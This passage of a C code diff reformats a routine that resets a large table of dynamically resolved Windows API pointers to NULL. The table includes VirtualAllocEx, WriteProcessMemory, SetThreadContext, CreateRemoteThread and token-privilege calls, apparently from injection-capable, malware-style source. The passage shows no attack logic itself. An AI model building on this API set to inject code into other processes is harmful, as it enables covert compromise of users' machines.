-	f_CreateProcessA							= NULL;
-	f_HeapFree									= NULL;
-	f_HeapReAlloc								= NULL;
-	f_VirtualAlloc								= NULL;
-	f_VirtualAllocEx							= NULL;
-	f_WriteProcessMemory						= NULL;
-	f_ReadProcessMemory							= NULL;
-	f_GetThreadContext							= NULL;
-	f_SetThreadContext							= NULL;
-	f_ResumeThread								= NULL;
-	f_ExpandEnvironmentStringsA					= NULL;
-	f_GetCurrentProcess							= NULL;
-	f_PathFindFileNameA							= NULL;
-	f_CreateRemoteThread						= NULL;
-	f_CreateEventA								= NULL;
-	f_OutputDebugStringA						= NULL;
-	f_Sleep										= NULL;
-	f_GetLastError								= NULL;
-	f_OpenEventA								= NULL;
-	f_CreateToolhelp32Snapshot					= NULL;
-	f_Process32First							= NULL;
-	f_Process32Next								= NULL;
-	f_OpenProcessToken							= NULL;
-	f_LookupPrivilegeValueA						= NULL;
-	f_AdjustTokenPrivileges						= NULL;
-	f_OpenProcess								= NULL;
-	f_VirtualProtect							= NULL;
-	f_GetCurrentProcessId						= NULL;
-	f_GetCurrentThreadId						= NULL;
-	f_Thread32First								= NULL;
-	f_OpenThread								= NULL;
-	f_SuspendThread								= NULL;
-	f_ResumeThread								= NULL;
-	f_Thread32Next								= NULL;
-	f_InitializeCriticalSection					= NULL;
-	f_EnterCriticalSection						= NULL;
-	f_LeaveCriticalSection						= NULL;
-	f_VirtualQuery								= NULL;
-	f_WriteFile									= NULL;
-	f_wvsprintfA								= NULL;
-	f_wvsprintfW								= NULL;
-	f_OutputDebugStringW						= NULL;
-	f_CharLowerA								= NULL;
-	f_InternetCrackUrlA							= NULL;
-	f_GetSystemTime								= NULL;
-	f_CryptAcquireContextW						= NULL;
-	f_CryptCreateHash							= NULL;
-	f_CryptHashData								= NULL;
-	f_CryptGetHashParam							= NULL;
-	f_CryptDestroyHash							= NULL;
-	f_CryptReleaseContext						= NULL;
-	f_GetLocalTime								= NULL;
-	f_MultiByteToWideChar						= NULL;
-	fStrCmpNICA									= NULL;
-	f_HeapCreate								= NULL;
-	f_vsnprintfA								= NULL;
-	f_CreateThread								= NULL;
-	f_VirtualFree								= NULL;
-	f_InternetQueryOption						= NULL;
-	f_FindResourceA								= NULL;
-	f_LoadResource								= NULL;
-	f_LockResource								= NULL;
-	f_SizeofResource							= NULL;
-	f_IsBadReadPtr								= NULL;
-	f_CreateDirectoryA							= NULL;
-	f_IsBadWritePtr								= NULL;
-	f_CreateMutexA								= NULL;
-	f_ReleaseMutex								= NULL;
-	f_OpenMutexA								= NULL;
-	f_WaitForSingleObject						= NULL;
-	f_CreateEventA								= NULL;
-	f_OpenEventA								= NULL;
-	f_SetEvent									= NULL;
-	f_DeleteFileA								= NULL;
-	f_GetCommandLineA							= NULL;
-	f_HeapSize									= NULL;
-	f_TerminateThread							= NULL;
-	f_DeleteCriticalSection						= NULL;
-	f_SetFilePointer							= NULL;
+	f_GetModuleFileNameA = NULL;
+	f_GetProcAddress = NULL;
+	f_LoadLibraryA = NULL;
+	f_GetModuleHandleA = NULL;
+	f_ExitProcess = NULL;
+	f_SHGetFolderPathA = NULL;
+	f_PathCombineA = NULL;
+	f_CreateFileA = NULL;
+	f_GetFileSize = NULL;
+	f_HeapAlloc = NULL;
+	f_GetProcessHeap = NULL;
+	f_ReadFile = NULL;
+	f_CloseHandle = NULL;
+	f_CreateProcessA = NULL;
+	f_HeapFree = NULL;
+	f_HeapReAlloc = NULL;
+	f_VirtualAlloc = NULL;
+	f_VirtualAllocEx = NULL;
+	f_WriteProcessMemory = NULL;
+	f_ReadProcessMemory = NULL;
+	f_GetThreadContext = NULL;
+	f_SetThreadContext = NULL;
+	f_ResumeThread = NULL;
+	f_ExpandEnvironmentStringsA = NULL;
+	f_GetCurrentProcess = NULL;
+	f_PathFindFileNameA = NULL;
+	f_CreateRemoteThread = NULL;
+	f_CreateEventA = NULL;
+	f_OutputDebugStringA = NULL;
+	f_Sleep = NULL;
+	f_GetLastError = NULL;
+	f_OpenEventA = NULL;
+	f_CreateToolhelp32Snapshot = NULL;
+	f_Process32First = NULL;
+	f_Process32Next = NULL;
+	f_OpenProcessToken = NULL;
+	f_LookupPrivilegeValueA = NULL;
+	f_AdjustTokenPrivileges = NULL;
+	f_OpenProcess = NULL;
+	f_VirtualProtect = NULL;
+	f_GetCurrentProcessId = NULL;
+	f_GetCurrentThreadId = NULL;
+	f_Thread32First = NULL;
+	f_OpenThread = NULL;
+	f_SuspendThread = NULL;
+	f_ResumeThread = NULL;
+	f_Thread32Next = NULL;
+	f_InitializeCriticalSection = NULL;
+	f_EnterCriticalSection = NULL;
+	f_LeaveCriticalSection = NULL;
+	f_VirtualQuery = NULL;
+	f_WriteFile = NULL;
+	f_wvsprintfA = NULL;
+	f_wvsprintfW = NULL;
+	f_OutputDebugStringW = NULL;
+	f_CharLowerA = NULL;
+	f_InternetCrackUrlA = NULL;
+	f_GetSystemTime = NULL;
+	f_CryptAcquireContextW = NULL;
+	f_CryptCreateHash = NULL;
+	f_CryptHashData = NULL;
+	f_CryptGetHashParam = NULL;
+	f_CryptDestroyHash = NULL;
+	f_CryptReleaseContext = NULL;
+	f_GetLocalTime = NULL;
+	f_MultiByteToWideChar = NULL;
+	fStrCmpNICA = NULL;
+	f_HeapCreate = NULL;
+	f_vsnprintfA = NULL;
+	f_CreateThread = NULL;
+	f_VirtualFree = NULL;
+	f_InternetQueryOption = NULL;
+	f_FindResourceA = NULL;
+	f_LoadResource = NULL;
+	f_LockResource = NULL;
+	f_SizeofResource = NULL;
+	f_IsBadReadPtr = NULL;
+	f_CreateDirectoryA = NULL;
+	f_IsBadWritePtr = NULL;
+	f_CreateMutexA = NULL;
+	f_ReleaseMutex = NULL;
+	f_OpenMutexA = NULL;
+	f_WaitForSingleObject = NULL;
+	f_CreateEventA = NULL;
+	f_OpenEventA = NULL;
+	f_SetEvent = NULL;
+	f_DeleteFileA = NULL;
+	f_GetCommandLineA = NULL;
+	f_HeapSize = NULL;
+	f_TerminateThread = NULL;
+	f_DeleteCriticalSection = NULL;
+	f_SetFilePointer = NULL;
 
 	return;
 }
